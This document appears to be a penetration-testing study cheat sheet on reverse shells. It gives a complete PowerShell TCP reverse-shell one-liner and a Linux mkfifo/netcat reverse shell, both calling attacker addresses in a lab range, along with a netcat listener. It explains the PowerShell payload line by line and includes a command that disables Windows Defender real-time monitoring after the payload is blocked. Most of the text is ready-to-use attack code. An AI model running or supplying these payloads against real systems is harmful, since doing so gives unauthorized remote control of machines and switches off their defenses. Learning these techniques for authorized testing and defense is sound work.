# Reverse Shell
- https://www.revshells.com/
- -https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

### Examples
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- https://www.revshells.com/
```shell 
# Attacker starting a listener
sudo nc -lvnp 443

# Target connecting to the attacker
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.190',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```
#### Powershell Command explianed
```shell 
# Command explianed: 
powershell -nop -c # executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes

$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443); 
# ets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object

$stream = $client.GetStream();
# sets/evaluates the variable $stream equal to the GetStream() method of the $client object

[byte[]]$bytes = 0..65535|%{0}; 
# Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. 
# This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
#Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. 
# The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.

{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
# Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. 
# In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text.

$sendback = (iex $data 2>&1 | Out-String ); 
# Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable,
# then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings.
# Because Invoke-Expression is used, everything stored in $data will be run on the local computer. 

$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
# Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. 
# This will result in the shell prompt being PS C:\workingdirectoryofmachine >.

$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
# ets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

$client.Close()"
# This is the TcpClient.Close method that will be used when the connection is terminated.
```

What can happened when we hit enter in command prompt?
```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
Disable AV
```shell
Set-MpPreference -DisableRealtimeMonitoring $true
```
#### reverse shell on linux
```shell
#on target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# Command explianed: 
rm -f /tmp/f; # remove the file if it exists
mkfifo /tmp/f; # create a named pipe
cat /tmp/f | # read the named pipe
/bin/bash -i 2>&1 | # execute bash with input and output redirected 2>&1 
# ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).
nc 10.10.14.12 7777 > /tmp/f  #connect to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f
```